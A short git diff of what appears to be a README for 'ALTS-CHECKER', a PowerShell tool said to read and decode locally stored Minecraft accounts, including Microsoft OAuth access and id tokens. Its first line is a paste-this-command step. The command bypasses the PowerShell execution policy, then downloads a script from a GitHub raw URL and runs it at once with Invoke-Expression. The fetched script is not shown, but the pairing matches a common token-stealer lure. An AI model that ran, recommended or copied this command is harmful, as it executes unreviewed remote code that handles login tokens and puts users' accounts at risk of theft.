@@ -1,6 +1,7 @@
 - **`powershell -Command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass; Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/OnlyDehBest/alts-checker/main/alts-checker.ps1')"`**
 
 🛠️ **ALTS-CHECKER TOOL**
+
 🔐 PowerShell script to analyze locally stored Minecraft accounts.
 
 This PowerShell tool allows you to view, inspect, and decode Minecraft accounts stored in local files by TLauncher or the official Minecraft launcher, including Microsoft OAuth tokens (accessToken / id_token) when available.
